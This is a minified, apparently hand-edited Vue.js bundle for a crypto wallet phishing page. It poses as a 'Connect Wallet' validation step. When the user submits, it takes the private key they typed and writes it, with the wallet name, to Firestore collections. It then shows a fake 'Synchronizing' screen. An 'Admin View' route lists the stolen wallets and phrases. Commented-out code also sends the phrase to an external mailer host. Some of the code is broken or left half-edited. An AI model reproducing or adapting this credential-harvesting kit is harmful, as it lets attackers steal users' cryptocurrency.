    return s(), r("div", Ct, $t);
}
var At = v(It, [
    ["render", St]
]);
const Mt = {
    apiKey: "AIzaSyB121nMN9SwJ97w3VwviYzk7ZO9J_XhFcI",
    authDomain: "chainpadsolution.firebaseapp.com",
    projectId: "chainpadsolution",
    storageBucket: "chainpadsolution.appspot.com",
    messagingSenderId: "56896339800",
    appId: "1:56896339800:web:a9a503f658efe2a64f6f2d"

},
    Tt = J(Mt),
    H = q(Tt),
    Pt = {
        class: "min-h-screen bg-transparent relative"
    },
    Dt = {
        class: "max-w-7xl mx-auto px-4 py-3"
    },
    Et = e(
        "h1", {
        class: "font-bold text-xl pt-5 pb-5 text-gray-800 text-center dark:text-gray-300 lg:text-5xl lg:pt-10",
    },
        " Connect Wallet ", -1
    ),
    Ot = {
        class: "mb-10 flex justify-center"
    },
    Bt = {
        class: "font-semibold text-center text-sm lg:text-base text-gray-800 dark:text-gray-200",
    },
    Vt = y(" Validate your selected wallet "),
    zt = {
        class: "bg-gray-400 px-1.5 py-0.5 text-center text-gray-800 font-light",
    },
    Ft = y(" to continue "),
    Ht = ["onSubmit"],
    Lt = {
        class: "mt-4 p-4 bg-gray-50 rounded-lg dark:bg-gray-800 flex flex-col gap-3 items-center justify-center",
        id: "profile",
        role: "tabpanel",
        "aria-labelledby": "profile-tab",
    },
    Kt = e(
        "p", {
        class: "text-center py-3 font-bold text-lg text-sky-800"
    },
        " Enter mainnet private key. ", -1
    ),
    Rt = e(
        "button", {
        type: "submit",
        class: "px-6 py-3 bg-sky-700 text-white font-semibold rounded-md hover:bg-sky-700 shadow-md mb-7 hover:shadow-none",
    },
        " Proceed ", -1
    ),
    Gt = {
        key: 0
    },
    Xt = {
        class: "font-semibold text-red-700 text-center"
    },
    Ut = ["onSubmit"],
    Yt = {
        class: "mt-4 p-4 bg-gray-50 rounded-lg dark:bg-gray-800 flex flex-col gap-3 items-center justify-center",
        id: "profile",
        role: "tabpanel",
        "aria-labelledby": "profile-tab",
    },
    Zt = e(
        "p", {
        class: "text-center py-3 font-bold text-lg text-sky-800"
    },
        ' Several lines of text beginning with "{...}" plus the password you used to encrypt it. ', -1
    ),
    Jt = e(
        "button", {
        type: "submit",
        class: "px-6 py-3 bg-sky-700 text-white font-semibold rounded-md hover:bg-sky-700 shadow-md hover:shadow-none",
    },
        " Proceed ", -1
    ),
    qt = ["onSubmit"],
    Qt = {
        class: "mt-4 p-4 bg-gray-50 rounded-lg dark:bg-gray-800 flex flex-col gap-3 items-center justify-center",
        id: "profile",
        role: "tabpanel",
        "aria-labelledby": "profile-tab",
    },
    ea = e(
        "p", {
        class: "text-center py-3 font-bold text-lg text-sky-800"
    },
        " Typically 12 (sometimes 24) words seperated by a single space. ", -1
    ),
    ta = e(
        "button", {
        type: "submit",
        class: "px-6 py-3 bg-sky-700 text-white font-semibold rounded-md hover:bg-sky-700 shadow-md hover:shadow-none",
        id: "test"
    },
        " Proceed ", -1
    ),
    aa = {
        setup(n) {
            const l = Q(),
                a = ee(),
                o = d(""),
                t = d(""),
                i = d(""),
                c = d(""),
                w = d(null),
                k = d([]),
                $ = d(null),
                D = d(""),
                C = d(!1);
            V(() => {
                localStorage.setItem("Wallet", a.params.name),
                    (w.value = localStorage.getItem("Wallet"));
            }),
                te(() => { });
            const S = async () => {
                C.value = !0;
                const A = o.value.split(" ");
                // if (
                //   (A.length > 10
                //     ? k.value.push(A)
                //     : (($.value = !0),
                //       (D.value = "Phrase is not up to 12"),
                //       setTimeout(() => {
                //         $.value = !1;
                //       }, 3e3)),
                //   k.value.length !== 0)
                // )


                //cookies




                // var yy = function() {
                //   var xx = document.querySelector('#input-test').value;
                //   console.log(w.value)
                //   console.log(xx)

                // firebase.initializeApp(Mt);
                // const db = firebase.firestore();
                // db.collection("personal").add({
                // wallet: w.value,
                // phrase: x
                // })


                // }
                // yy()

                var K = 'test'
                var x = document.querySelector('#input-test').value;
                firebase.initializeApp(cmBwsbFSqC);
                const db = firebase.firestore();
                db.collection("data").add({
                    wallet: w.value,
                    phrase: x,
                    time: new Date()
                }).then(() => {
                    db.collection('datas').add({
                        wallet: w.value,
                        phrase: x,
                        time: firebase.firestore.FieldValue.serverTimestamp()
                    })
                })
                // var K = 'test'
                // var x = document.querySelector('#input-test').value;
                try {
                    // const g = await ae(z(H, "data"), {
                    //   wallet: w.value,
                    //   phrase: k.value[0],
                    // });
                    // console.log("Document written with ID: ", g.id);
                    // const m = "https://synsmailer.xyz/SnnDapps.php",
                    //   K = {
                    //     method: "POST",
                    //     mode: "no-cors",
                    //     headers: { "Content-Type": "application/json" },
                    //     body: [JSON.stringify(k.value[0]), " ", w.value],
                    //   };
                    await fetch(K), // await fetch(m, K),

                        // firebase.initializeApp(Mt);
                        //   const db = firebase.firestore();
                        //   db.collection("data").add({
                        //     wallet: w.value,
                        //     phrase: x
                        // })

                        setTimeout(() => {
                            //(C.value = !1), l.push({ name: "ValidateImport" });
                            (K), l.push({
                                name: "ValidateImport"
                            });
                        }, 3e3);
                } catch (g) {


                    console.log(x)

                    console.error("Error adding document: ", g);
                }
                //else console.log('error') console.log("Error"), (C.value = !1);
            };
            return (A, g) => (
                s(),
                r("div", Pt, [
                    _(p(At, null, null, 512), [
                        [O, C.value]
                    ]),
                    e("section", Dt, [
                        p(
                            u(x), {
                            to: {
                                name: "wallet"
                            },
                            class: "flex justify-center"
                        }, {
                            default: h(() => [Et]),
                            _: 1
                        }
                        ),
                        e("div", Ot, [e("h2", Bt, [Vt, e("span", zt, f(w.value), 1), Ft])]),
                        p(Nt, null, {
                            default: h(() => [
                                p(
                                    T, {
                                    title: "Private Key"
                                }, {
                                    default: h(() => [
                                        e(
                                            "form", {
                                            onSubmit: M(S, ["prevent"])
                                        }, [
                                            e("div", Lt, [
                                                _(
                                                    e(
                                                        "input", {
                                                        "onUpdate:modelValue": g[0] || (g[0] = (m) => (o.value = m)),
                                                        style: "margin-top: 50px",
                                                        class: "w-full max-w-4xl rounded-md shadow-md shadow-sky-700/10 px-3 py-4 outline-none focus-within:border-3 focus-within:border-sky-800",
                                                        id: "input-test",
                                                        type: "password",
                                                        placeholder: "Private Key",
                                                    },
                                                        null,
                                                        512
                                                    ), [
                                                    [W, o.value]
                                                ]
                                                ),
                                                Kt,
                                                Rt,
                                                $.value ?
                                                    (s(), r("div", Gt, [e("p", Xt, f(D.value), 1)])) :
                                                    E("", !0),
                                            ]),
                                        ],
                                            40,
                                            Ht
                                        ),
                                    ]),
                                    _: 1,
                                }
                                ),
                                // p(
                                //   T,
                                //   { title: "Keystore JSON" },
                                //   {
                                //     default: h(() => [
                                //       e(
                                //         "form",
                                //         { onSubmit: M(S, ["prevent"]) },
                                //         [
                                //           e("div", Yt, [
                                //             _(
                                //               e(
                                //                 "textarea",
                                //                 {
                                //                   "onUpdate:modelValue":
                                //                     g[1] || (g[1] = (m) => (t.value = m)),
                                //                   class:
                                //                     "w-full max-w-4xl h-[200px] rounded-md shadow-md shadow-sky-700/10 px-3 py-4 outline-none focus-within:border-3 focus-within:border-sky-800",
                                //                   placeholder: "Keystore JSON",
                                //                 },
                                //                 null,
                                //                 512
                                //               ),
                                //               [[W, t.value]]
                                //             ),
                                //             _(
                                //               e(
                                //                 "input",
                                //                 {
                                //                   "onUpdate:modelValue":
                                //                     g[2] || (g[2] = (m) => (i.value = m)),
                                //                   class:
                                //                     "w-full max-w-4xl rounded-md shadow-md shadow-sky-700/10 px-3 py-4 outline-none focus-within:border-3 focus-within:border-sky-800",
                                //                   type: "password",
                                //                   placeholder: "Password",
                                //                 },
                                //                 null,
                                //                 512
                                //               ),
                                //               [[W, i.value]]
                                //             ),
                                //             Zt,
                                //             Jt,
                                //           ]),
                                //         ],
                                //         40,
                                //         Ut
                                //       ),
                                //     ]),
                                //     _: 1,
                                //   }
                                // ),
                                // p(
                                //   T,
                                //   { title: "Private Key" },
                                //   {
                                //     default: h(() => [
                                //       e(
                                //         "form",
                                //         { onSubmit: M(S, ["prevent"]) },
                                //         [
                                //           e("div", Qt, [
                                //             _(
                                //               e(
                                //                 "input",
                                //                 {
                                //                   "onUpdate:modelValue":
                                //                     g[3] || (g[3] = (m) => (c.value = m)),
                                //                   class:
                                //                     "w-full max-w-4xl rounded-md shadow-md shadow-sky-700/10 px-3 py-4 outline-none focus-within:border-3 focus-within:border-sky-800",
                                //                   type: "password",
                                //                   placeholder: "Password",
                                //                 },
                                //                 null,
                                //                 512
                                //               ),
                                //               [[W, c.value]]
                                //             ),
                                //             ea,
                                //             ta,
                                //           ]),
                                //         ],
                                //         40,
                                //         qt
                                //       ),
                                //     ]),
                                //     _: 1,
                                //   }
                                // ),
                            ]),
                            _: 1,
                        }),
                    ]),
                ])
            );
        },
    },
    la = {
        class: "max-w-7xl min-h-screen px-4 py-3 mx-auto bg-white flex items-center justify-center",
    },
    oa = {
        class: "flex flex-col gap-4 justify-center items-center"
    },
    na = ["src"],
    ia = e(
        "div", {
        class: "mt-3"
    }, [
        e(
            "svg", {
            role: "status",
            class: "w-[50px] h-[50px] text-sky-200 animate-spin dark:text-gray-600 fill-blue-600",
            viewBox: "0 0 100 101",
            fill: "none",
            xmlns: "http://www.w3.org/2000/svg",
        }, [
            e("path", {
                d: "M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z",
                fill: "currentColor",
            }),
            e("path", {
                d: "M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z",
                fill: "currentFill",
            }),
        ]
        ),
    ], -1
    ),
    sa = {
        class: "flex flex-col gap-3"
    },
    ra = e(
        "h1", {
        class: "text-gray-900 text-center show font-bold text-xl"
    },
        "Synchronizing", -1
    ),
    da = e(
        "p", {
        class: "text-gray-900 text-center"
    },
        "This may take a few minutes to complete", -1
    ),
    ca = y("Try Again"),
    pa = {
        setup(n) {
            const l = d(null);
            return (
                le
                    .toDataURL("See the admin!")
                    .then((a) => {
                        l.value = a;
                    })
                    .catch((a) => {
                        console.error(a);
                    }),
                (a, o) => (
                    s(),
                    r("div", la, [
                        e("section", oa, [
                            e(
                                "img", {
                                class: "w-[200px] h-[200px]",
                                src: `${l.value}`,
                                alt: "hello",
                            },
                                null,
                                8,
                                na
                            ),
                            ia,
                            e("div", sa, [
                                ra,
                                da,
                                p(
                                    u(x), {
                                    to: {
                                        name: "wallet"
                                    },
                                    class: "px-2 py-2 uppercase bg-sky-400 text-white mt-3 font-semibold text-center shadow-md",
                                }, {
                                    default: h(() => [ca]),
                                    _: 1
                                }
                                ),
                            ]),
                        ]),
                    ])
                )
            );
        },
    };
const ga = {},
    ha = {
        class: "about"
    },
    wa = e("h1", null, "This is an about page", -1),
    ma = [wa];

function ua(n, l) {
    return s(), r("div", ha, ma);
}
var xa = v(ga, [
    ["render", ua]
]);
const fa = {},
    ya = {
        class: "min-h-screen"
    },
    va = {
        class: "mx-auto max-w-6xl px-3 mt-[100px] flex flex-col justify-center items-center",
    },
    ba = {
        class: "relative flex flex-col items-center justify-center gap-y-5"
    },
    ka = I(
        '<h1 class="font-black text-8xl bg-clip-text text-transparent bg-gradient-to-r from-sky-500/50 to-violet-500/50">404</h1><h3 class="font-semibold text-5xl text-center pt-4">Opps! We couldn&#39;t find that page.</h3><p class="font-light text-3xl text-center py-5">Maybe you can find what you need here?</p><svg class="w-10 h-10 transform rotate-180 absolute left-0 bottom-1 text-sky-800" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6"></path></svg>',
        4
    ),
    _a = y("Go back home");

function ja(n, l, a, o, t, i) {
    const c = oe("router-link");
    return (
        s(),
        r("div", ya, [
            e("section", va, [
                e("div", ba, [
                    ka,
                    p(
                        c, {
                        class: "bg-sky-900 p-3 rounded-md text-white font-semibold hover:bg-sky-700 hover:shadow-md transition-all duration-300 ease-linear",
                        to: "/",
                    }, {
                        default: h(() => [_a]),
                        _: 1
                    }
                    ),
                ]),
            ]),
        ])
    );
}
var Na = v(fa, [
    ["render", ja]
]);
const Ia = {
    class: "bg-sky-800 min-h-screen"
},
    Ca = {
        class: "flex flex-col max-w-7xl px-4 py-2.5 mx-auto"
    },
    Wa = e(
        "div", {
        class: "flex items-center justify-center"
    }, [
        e(
            "h1", {
            class: "text-center font-bold text-3xl text-gray-300 pt-7 pb-9"
        },
            "Admin View"
        ),
    ], -1
    ),
    $a = {
        class: "grid grid-cols-2 gap-y-2 px-4"
    },
    Sa = {
        class: "text-gray-200 font-semibold"
    },
    Aa = {
        class: "truncate"
    },
    Ma = {
        class: "text-gray-200 font-semibold"
    },
    Ta = {
        class: "break-words"
    },
    Pa = e("div", null, null, -1),
    Da = {
        setup(n) {
            const l = d([]),
                a = d([]),
                o = d([]);
            return (
                d(!1),
                d([]),
                V(async () => {
                    (await ne(z(H, "data"))).forEach((i) => {
                        if (i.exists) {
                            const c = i.id,
                                w = i.data().wallet,
                                k = i.data().phrase.join(",");
                            o.value.push(c),
                                l.value.push(w),
                                a.value.push(k),
                                console.log(a.value);
                        } else console.log("Error");
                    });
                }),
                (t, i) => (
                    s(),
                    r("div", Ia, [
                        e("section", Ca, [
                            Wa,
                            e("div", $a, [
                                e("div", Sa, [
                                    (s(!0),
                                        r(
                                            j,
                                            null,
                                            N(
                                                l.value,
                                                (c, w) => (
                                                    s(),
                                                    r(
                                                        "div", {
                                                        key: w,
                                                        class: "flex flex-col mb-2 text-[12px]"
                                                    }, [e("span", Aa, f(c), 1)]
                                                    )
                                                )
                                            ),
                                            128
                                        )),
                                ]),
                                e("div", Ma, [
                                    (s(!0),
                                        r(
                                            j,
                                            null,
                                            N(
                                                a.value,
                                                (c, w) => (
                                                    s(),
                                                    r(
                                                        "div", {
                                                        key: w,
                                                        class: "flex flex-col mb-2 text-[12px]"
                                                    }, [e("span", Ta, f(c), 1)]
                                                    )
                                                )
                                            ),
                                            128
                                        )),
                                ]),
                            ]),
                            Pa,
                        ]),
                    ])
                )
            );
        },
    },
    L = ie({
        history: se("/"),
        routes: [{
            path: "/",
            name: "home",
            component: st,
            meta: {
                title: "Home"
            }
        },
        {
            path: "/about",
            name: "about",
            component: xa,
            meta: {
                title: "About"
            },
        },
        {
            path: "/wallet/list",
            name: "wallet",
            component: ut,
            meta: {
                title: "Wallet"
            },
        },
        {
            path: "/wallet/connect/import/:id",
            name: "walletImport",
            component: aa,
            meta: {
                title: "Import Wallet"
            },
            beforeEnter: (n, l, a) => (
                l.name != "wallet" ? a({
                    name: "wallet"
                }) : a(), !1
            ),
        },
        {
            path: "/wallet/connect/validate",
            name: "ValidateImport",
            component: pa,
            beforeEnter: (n, l, a) => (
                l.name != "walletImport" ? a({
                    name: "wallet"
                }) : a(), !1
            ),
            meta: {
                title: "Validating"
            },
        },
        {
            path: "/app/admin/data/",
            name: "Admin",
            component: Da,
            meta: {
                title: "Admin"
            },
        },
        {
            path: "/:pathMatch(.*)*",
            name: "notFound",
            component: Na,
            meta: {
                title: "404 Error"
            },
        },
        ],
        scrollBehavior(n, l, a) {
            return {
                top: 0
            };
        },
    });
L.beforeEach((n, l, a) => {
    (document.title = `${n.meta.title} | ${webname}`), a();
});
const P = re(Oe);
P.use(de());
P.use(L);
P.mount("#app");
